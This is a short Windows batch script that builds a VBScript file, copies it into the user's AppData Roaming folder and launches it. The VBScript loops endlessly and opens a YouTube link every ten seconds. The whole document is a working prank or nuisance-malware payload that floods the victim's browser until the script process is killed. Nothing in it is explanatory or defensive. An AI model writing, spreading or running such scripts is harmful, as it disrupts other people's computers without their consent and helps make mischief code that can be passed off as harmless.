@echo off

echo do >> "wapbap.vbs"
echo CreateObject("WScript.Shell").Run("https://youtu.be/4gSOMba1UdM?t=48") >> "wapbap.vbs"
echo WScript.Sleep 10000 >> "wapbap.vbs"
echo loop >> "wapbap.vbs"

copy wapbap.vbs C:\Users\%username%\AppData\Roaming\wapbap.vbs

start C:\Users\%username%\AppData\Roaming\wapbap.vbs

exit